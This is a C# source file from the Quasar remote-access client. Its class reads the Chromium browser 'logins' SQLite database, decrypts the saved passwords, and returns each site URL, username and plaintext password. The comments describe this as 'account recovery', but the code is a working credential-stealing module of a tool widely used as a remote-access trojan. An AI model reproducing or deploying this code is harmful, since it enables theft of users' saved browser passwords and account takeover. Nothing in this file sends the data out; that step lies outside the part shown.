using Quasar.Client.Recovery.Utilities;
using Quasar.Common.Models;
using System;
using System.Collections.Generic;
using System.IO;

namespace Quasar.Client.Recovery.Browsers
{
    /// <summary>
    /// Provides basic account recovery capabilities from chromium-based applications.
    /// </summary>
    public abstract class ChromiumBase : IAccountReader
    {
        /// <inheritdoc />
        public abstract string ApplicationName { get; }

        /// <inheritdoc />
        public abstract IEnumerable<RecoveredAccount> ReadAccounts();

        /// <summary>
        /// Reads the stored accounts of an chromium-based application.
        /// </summary>
        /// <param name="filePath">The file path of the logins database.</param>
        /// <param name="localStatePath">The file path to the local state.</param>
        /// <returns>A list of recovered accounts.</returns>
        protected List<RecoveredAccount> ReadAccounts(string filePath, string localStatePath)
        {
            var result = new List<RecoveredAccount>();

            if (File.Exists(filePath))
            {
                SQLiteHandler sqlDatabase;

                if (!File.Exists(filePath))
                    return result;

                var decryptor = new ChromiumDecryptor(localStatePath);

                try
                {
                    sqlDatabase = new SQLiteHandler(filePath);
                }
                catch (Exception)
                {
                    return result;
                }

                if (!sqlDatabase.ReadTable("logins"))
                    return result;

                for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
                {
                    try
                    {
                        var host = sqlDatabase.GetValue(i, "origin_url");
                        var user = sqlDatabase.GetValue(i, "username_value");
                        var pass = decryptor.Decrypt(sqlDatabase.GetValue(i, "password_value"));

                        if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(user))
                        {
                            result.Add(new RecoveredAccount
                            {
                                Url = host,
                                Username = user,
                                Password = pass,
                                Application = ApplicationName
                            });
                        }
                    }
                    catch (Exception)
                    {
                        // ignore invalid entry
                    }
                }
            }
            else
            {
                throw new FileNotFoundException("Can not find chromium logins file");
            }

            return result;
        }
    }
}
